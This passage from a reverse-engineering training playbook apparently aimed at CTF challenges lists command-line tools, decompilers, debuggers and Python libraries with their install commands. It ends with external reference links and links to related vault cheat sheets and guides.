| Tool | Purpose | Install |
|---|---|---|
| `file` | Identify file type | preinstalled |
| `strings` | Extract readable strings | preinstalled |
| `checksec` | Check binary mitigations | `pip install checksec.py` |
| `objdump` | Disassemble sections | `binutils` |
| `readelf` | ELF header / section / symbol info | `binutils` |
| `nm` | List symbols | `binutils` |
| `ltrace` | Library call trace | package manager |
| `strace` | System call trace | package manager |
| `binwalk` | Firmware / embedded file scan | `pip install binwalk` |
| `upx` | Unpack UPX-compressed binaries | package manager |
| `rabin2` | Radare2 binary info | `radare2` |
| `pwn` | Pwntools CLI (cyclic, checksec) | `pip install pwntools` |
| `ROPgadget` | Find ROP gadgets | `pip install ROPGadget` |
| `ropper` | Find ROP gadgets (alternative) | `pip install ropper` |

Open [Reversing CLI Tools Cheat Sheet](tools/Reversing%20CLI%20Tools%20Cheat%20Sheet.md) for practical command sequences and decision points for each tool.

### Decompilers & Disassemblers

| Tool | Targets | Notes |
|---|---|---|
| **[Ghidra](tools/Ghidra%20Cheat%20Sheet.md)** | ELF, PE, Mach-O, ARM, MIPS | Free, Java-based, excellent decompiler |
| **[IDA Pro / Free](tools/IDA%20Pro%20Cheat%20Sheet.md)** | ELF, PE, Mach-O, etc. | Industry standard static analysis |
| **Cutter** | ELF, PE | GUI for Radare2, good decompiler |
| **Radare2** | ELF, PE, many formats | CLI powerhouse, steep learning curve |
| **jadx** | APK, JAR, .class | Java/Android decompiler |
| **dnSpyEx** | .NET | .NET debugger and decompiler |
| **ILSpy** | .NET | .NET decompiler |
| **WABT** | WebAssembly | `wasm2wat`, `wasm-decompile` |
| **PyLingual** | Python bytecode | Online decompiler |
| **uncompyle6** | Python 2.x/3.x bytecode | Best for older Python versions |

### Debuggers

| Tool | Platform | Best for |
|---|---|---|
| **[GDB + GEF](tools/GDB%20Cheat%20Sheet.md)** | Linux | ELF binaries, pwn challenges, context views |
| **GDB + pwndbg** | Linux | Enhanced GDB with CTF features |
| **[x64dbg](tools/x64dbg%20Cheat%20Sheet.md)** | Windows | User-mode PE debugging and unpacking |
| **WinDbg** | Windows | Kernel and low-level debugging |
| **Process Monitor** | Windows | File/registry/process monitoring |

Open [GDB (gef) Cheat Sheet](tools/GDB%20Cheat%20Sheet.md) for GEF command syntax, memory examination, comparison breakpoints, and batch-mode scripts. See also [IDA Pro Cheat Sheet](tools/IDA%20Pro%20Cheat%20Sheet.md), [Ghidra Cheat Sheet](tools/Ghidra%20Cheat%20Sheet.md), and [x64dbg Cheat Sheet](tools/x64dbg%20Cheat%20Sheet.md) for custom hotkeys and workflows.

### Python Libraries

Install common RE stack:

```bash
python -m pip install pycryptodome z3-solver angr capstone keystone-engine unicorn lief pefile pyelftools pwntools
```

For image/OCR/QR automation:

```bash
python -m pip install pillow pytesseract pyzbar requests
```

| Library | Purpose |
|---|---|
| `pwntools` | Packing, tubes, ELF helpers, cyclic patterns |
| `z3-solver` | SMT constraint solving |
| `angr` | Binary symbolic execution |
| `capstone` | Disassembly engine |
| `keystone` | Assembly engine |
| `unicorn` | CPU emulation |
| `lief` | PE/ELF/Mach-O parsing and patching |
| `pefile` | PE file parsing |
| `pyelftools` | ELF file parsing |
| `pycryptodome` | AES, DES, ARC4, RSA |
| `struct` | Binary pack/unpack (stdlib) |
| `dis` | Python bytecode disassembly (stdlib) |
| `marshal` | Python code object serialization (stdlib) |

### External References

| Resource | URL |
|---|---|
| Anti-debug reference | https://anti-debug.checkpoint.com/ |
| PyLingual (online decompiler) | https://www.pylingual.io/ |
| Online x86 assembler | https://defuse.ca/online-x86-assembler.htm |
| pyinstxtractor | https://github.com/extremecoders-re/pyinstxtractor |
| decompyle builds | https://github.com/extremecoders-re/decompyle-builds |
| GTFOBins | https://gtfobins.github.io/ |
| Shell-storm syscall table | https://shell-storm.org/shellcode/files/syscalls.html |

[↑ Back to Table of Contents](#table-of-contents)

---

## Linked Vault Pages

These connect this playbook to the rest of the H4G Training Vault:

- [Reverse Engineering Blueprint](blueprints/Reverse%20Engineering%20Blueprint.md) — detailed decision-tree workflow
- [Buffer Overflow Blueprint](blueprints/Buffer%20Overflow%20Blueprint.md) — full pwn/bof guide
- [REV Python Toolkit](tools/REV%20Python%20Toolkit.md) — extended Python helper library
- [IDA Pro Cheat Sheet](tools/IDA%20Pro%20Cheat%20Sheet.md) - local IDA Pro command and navigation reference
- [Ghidra Cheat Sheet](tools/Ghidra%20Cheat%20Sheet.md) - local Ghidra UI and scripting reference
- [x64dbg Cheat Sheet](tools/x64dbg%20Cheat%20Sheet.md) - local x64dbg dynamic debugger reference
- [GDB (gef) Cheat Sheet](tools/GDB%20Cheat%20Sheet.md) - local GDB (gef) context debugger reference
- [Vim For Reversing Cheat Sheet](tools/Vim%20For%20Reversing%20Cheat%20Sheet.md) - local editing and hex workflow reference
- [Reversing CLI Tools Cheat Sheet](tools/Reversing%20CLI%20Tools%20Cheat%20Sheet.md) - local CLI command reference
- [picoCTF Web and REV Patterns](guides/picoCTF%20Web%20and%20REV%20Patterns.md) — CTF-specific patterns
- [Reverse Engineering Fundamentals](learning/Reverse%20Engineering%20Fundamentals.md) — beginner learning path
- [Guide to x86 Assembly](references/Guide%20to%20x86%20Assembly.html) — local x86 reference
- [Linux x86_64 Syscall Table](references/Linux%20System%20Call%20Table%20for%20x86%2064%20-%20Ryan%20A.%20Chapman.html) — syscall reference
- [Challenge Use Cases](references/Challenge%20Use%20Cases.md) — worked examples
- [REV Source Inventory](rev_source/README.md) — local solver scripts

[↑ Back to Table of Contents](#table-of-contents)
